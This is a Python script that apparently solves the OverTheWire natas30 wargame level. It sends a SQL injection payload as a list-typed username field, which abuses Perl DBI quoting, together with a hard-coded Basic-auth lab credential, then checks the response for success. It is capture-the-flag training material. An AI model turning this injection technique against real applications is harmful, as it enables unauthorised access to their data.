import requests

URL = 'http://natas30.natas.labs.overthewire.org'
PATH = '/index.pl'

headers = {
    'Authorization': 'Basic bmF0YXMzMDp3aWU5aWV4YWUwRGFpaG9odjh2dXUzY2VpOXdhaGYwZQ=='
}

payload = {
    'username': ['"natas31" OR "1"="1"', 3],
    'password': 'no password!'
}

bad = 'fail :('
good = 'here is your result:'

res = requests.post(URL+PATH, headers=headers, data=payload)
recieved_html = res.content.decode()


print(recieved_html)
print("====")

if bad in recieved_html:
    print("bad")

if good in recieved_html:
    print("good")
